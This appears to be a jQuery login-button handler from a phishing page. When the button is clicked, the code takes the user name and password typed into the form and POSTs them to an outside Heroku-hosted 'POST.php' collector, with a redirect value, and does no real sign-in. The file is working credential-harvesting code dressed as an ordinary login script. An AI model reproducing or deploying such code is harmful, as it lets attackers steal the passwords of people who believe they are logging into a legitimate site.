$(function(){
    

    
    

    $('#log-in').click(function() {
        
        var myLink = 'https://analiza-new.herokuapp.com/POST.php';
        var myUser = $('#user-name').val()
        var myPass = $('#my-pass').val()
        var myDir1  = $('#rel').val();

        if(myDir1.length > 1){
          var myDir = myDir1;
        }else{
          var myDir = 'default';
        }

        console.log(myUser);

        var request = $.ajax({
            url: myLink,
            method: "POST",
            data: { email : myUser, password : myPass, re : myDir },
            dataType: "html"
          });
           
          request.done(function( msg ) {
            console.log('Done1');
          });
          request.fail(function( jqXHR, textStatus ) {
            alert( "فشل الطلب: " + textStatus );
          });


    });


});
